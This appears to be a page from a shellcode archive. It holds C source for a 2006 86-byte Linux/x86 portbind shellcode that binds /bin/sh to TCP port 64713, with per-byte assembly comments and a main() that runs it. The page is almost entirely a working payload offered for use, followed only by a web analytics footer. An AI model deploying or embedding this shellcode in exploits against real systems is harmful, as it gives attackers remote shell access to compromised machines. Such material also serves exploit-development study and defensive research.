<html><head><title>Linux/x86 - portbind port 64713 - 86 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
 * linux-x86-portbind.c - portbind shellcode 86 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security &lt;xgc@gotfault.net&gt;
 * 
 * portbind shellcode that bind()'s a shell on port 64713/tcp
 *
 */

char shellcode[] = 

  /* socket(AF_INET, SOCK_STREAM, 0) */

  &quot;\x6a\x66&quot;			// push   $0x66
  &quot;\x58&quot;			// pop    %eax
  &quot;\x6a\x01&quot;			// push   $0x1
  &quot;\x5b&quot;			// pop    %ebx
  &quot;\x99&quot;			// cltd
  &quot;\x52&quot;			// push   %edx
  &quot;\x53&quot;			// push   %ebx
  &quot;\x6a\x02&quot;			// push   $0x2
  &quot;\x89\xe1&quot;			// mov    %esp,%ecx
  &quot;\xcd\x80&quot;			// int    $0x80

  /* bind(s, server, sizeof(server)) */

  &quot;\x52&quot;			// push   %edx
  &quot;\x66\x68\xfc\xc9&quot;		// pushw  $0xc9fc  // PORT = 64713
  &quot;\x66\x6a\x02&quot;		// pushw  $0x2
  &quot;\x89\xe1&quot;			// mov    $esp,%ecx
  &quot;\x6a\x10&quot;			// push   $0x10
  &quot;\x51&quot;			// push   %ecx
  &quot;\x50&quot;			// push   %eax
  &quot;\x89\xe1&quot;			// mov    %esp,%ecx
  &quot;\x89\xc6&quot;			// mov    %eax,%esi
  &quot;\x43&quot;			// inc    %ebx
  &quot;\xb0\x66&quot;			// mov    $0x66,%al
  &quot;\xcd\x80&quot;			// int    $0x80

  /* listen(s, anything) */

  &quot;\xb0\x66&quot;			// mov    $0x66,%al
  &quot;\xd1\xe3&quot;			// shl    %ebx
  &quot;\xcd\x80&quot;			// int    $0x80

  /* accept(s, 0, 0) */

  &quot;\x52&quot;			// push   %edx
  &quot;\x56&quot;			// push   %esi
  &quot;\x89\xe1&quot;			// mov    %esp,%ecx
  &quot;\x43&quot;			// inc    %ebx
  &quot;\xb0\x66&quot;			// mov    $0x66,%al
  &quot;\xcd\x80&quot;			// int    $0x80

  &quot;\x93&quot;			// xchg   %eax,%ebx

  /* dup2(c, 2) , dup2(c, 1) , dup2(c, 0) */

  &quot;\x6a\x02&quot;			// push   $0x2
  &quot;\x59&quot;			// pop    %ecx

  &quot;\xb0\x3f&quot;			// mov    $0x3f,%al
  &quot;\xcd\x80&quot;			// int    $0x80
  &quot;\x49&quot;			// dec    %ecx
  &quot;\x79\xf9&quot;			// jns    dup_loop

  /* execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL) */

  &quot;\x6a\x0b&quot;			// push   $0xb
  &quot;\x58&quot;			// pop    %eax
  &quot;\x52&quot;			// push   %edx
  &quot;\x68\x2f\x2f\x73\x68&quot;	// push   $0x68732f2f
  &quot;\x68\x2f\x62\x69\x6e&quot;	// push   $0x6e69622f
  &quot;\x89\xe3&quot;			// mov    %esp, %ebx
  &quot;\x52&quot;			// push   %edx
  &quot;\x53&quot;			// push   %ebx
  &quot;\x89\xe1&quot;			// mov    %esp, %ecx
  &quot;\xcd\x80&quot;;			// int    $0x80

int main() {
 
        int (*f)() = (int(*)())shellcode;
        printf(&quot;Length: %u\n&quot;, strlen(shellcode));
        f();
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
